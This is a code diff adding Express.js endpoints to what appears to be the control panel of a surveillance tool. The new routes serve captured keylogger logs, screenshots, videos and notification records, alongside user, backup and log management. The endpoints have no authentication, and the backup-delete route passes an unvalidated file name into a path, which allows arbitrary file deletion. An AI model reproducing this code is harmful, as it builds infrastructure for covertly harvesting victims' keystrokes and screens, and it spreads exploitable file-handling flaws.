@@ -138,6 +138,114 @@ setInterval(() => {
     });
 }, 2 * 60 * 1000);
 
+// --- USER MANAGEMENT (simple in-memory for demo, replace with persistent storage for production) ---
+let users = [];
+
+app.get('/owner/api/users', (req, res) => {
+    res.json({ users });
+});
+
+app.post('/owner/api/users/add', (req, res) => {
+    const { name } = req.body;
+    if (name && !users.includes(name)) {
+        users.push(name);
+        res.json({ success: true, users });
+    } else {
+        res.json({ success: false, error: "Invalid or duplicate user" });
+    }
+});
+
+app.post('/owner/api/users/remove', (req, res) => {
+    const { name } = req.body;
+    users = users.filter(u => u !== name);
+    res.json({ success: true, users });
+});
+
+// --- BACKUP MANAGEMENT (list/delete in ./storage) ---
+app.get('/owner/api/backups', (req, res) => {
+    const storageDir = path.join(__dirname, 'storage');
+    if (!fs.existsSync(storageDir)) return res.json({ backups: [] });
+    const files = fs.readdirSync(storageDir).filter(f => f.startsWith('backup'));
+    res.json({ backups: files });
+});
+
+app.post('/owner/api/backups/delete', (req, res) => {
+    const { name } = req.body;
+    const storageDir = path.join(__dirname, 'storage');
+    const filePath = path.join(storageDir, name);
+    if (fs.existsSync(filePath)) {
+        fs.unlinkSync(filePath);
+        res.json({ success: true });
+    } else {
+        res.json({ success: false, error: "File not found" });
+    }
+});
+
+app.post('/owner/api/backups/delete-all', (req, res) => {
+    const storageDir = path.join(__dirname, 'storage');
+    if (!fs.existsSync(storageDir)) return res.json({ success: true });
+    const files = fs.readdirSync(storageDir).filter(f => f.startsWith('backup'));
+    files.forEach(f => fs.unlinkSync(path.join(storageDir, f)));
+    res.json({ success: true });
+});
+
+// --- LOG VIEWING (show all logs in ./storage ending with .log) ---
+app.get('/owner/api/logs', (req, res) => {
+    const storageDir = path.join(__dirname, 'storage');
+    if (!fs.existsSync(storageDir)) return res.type('text/plain').send('[No logs]');
+    const logs = fs.readdirSync(storageDir).filter(f => f.endsWith('.log'));
+    let out = '';
+    logs.forEach(f => {
+        out += `--- ${f} ---\n`;
+        out += fs.readFileSync(path.join(storageDir, f), 'utf8') + '\n';
+    });
+    res.type('text/plain').send(out || '[No logs]');
+});
+
+// --- KEYLOGGER, SCREENSHOTS, VIDEOS, NOTIFICATIONS API ---
+
+// Keylogger logs (read all .keylog files in ./storage)
+app.get('/owner/api/keylogger', (req, res) => {
+    const storageDir = path.join(__dirname, 'storage');
+    if (!fs.existsSync(storageDir)) return res.type('text/plain').send('[No keylogger logs]');
+    const logs = fs.readdirSync(storageDir).filter(f => f.endsWith('.keylog'));
+    let out = '';
+    logs.forEach(f => {
+        out += `--- ${f} ---\n`;
+        out += fs.readFileSync(path.join(storageDir, f), 'utf8') + '\n';
+    });
+    res.type('text/plain').send(out || '[No keylogger logs]');
+});
+
+// Screenshots (list all images in ./storage/Screenshots)
+app.get('/owner/api/screenshots', (req, res) => {
+    const screenshotsDir = path.join(__dirname, 'storage', 'Screenshots');
+    if (!fs.existsSync(screenshotsDir)) return res.json({ screenshots: [] });
+    const files = fs.readdirSync(screenshotsDir).filter(f => /\.(png|jpg|jpeg)$/i.test(f));
+    res.json({ screenshots: files });
+});
+
+// Videos (list all videos in ./storage/Videos)
+app.get('/owner/api/videos', (req, res) => {
+    const videosDir = path.join(__dirname, 'storage', 'Videos');
+    if (!fs.existsSync(videosDir)) return res.json({ videos: [] });
+    const files = fs.readdirSync(videosDir).filter(f => /\.(mp4|avi|mov)$/i.test(f));
+    res.json({ videos: files });
+});
+
+// Notifications (read all .notify files in ./storage)
+app.get('/owner/api/notifications', (req, res) => {
+    const storageDir = path.join(__dirname, 'storage');
+    if (!fs.existsSync(storageDir)) return res.type('text/plain').send('[No notifications]');
+    const logs = fs.readdirSync(storageDir).filter(f => f.endsWith('.notify'));
+    let out = '';
+    logs.forEach(f => {
+        out += `--- ${f} ---\n`;
+        out += fs.readFileSync(path.join(storageDir, f), 'utf8') + '\n';
+    });
+    res.type('text/plain').send(out || '[No notifications]');
+});
+
 // --- HTTPS SERVER ---
 if (fs.existsSync(KEY_FILE) && fs.existsSync(CERT_FILE)) {
     https.createServer({
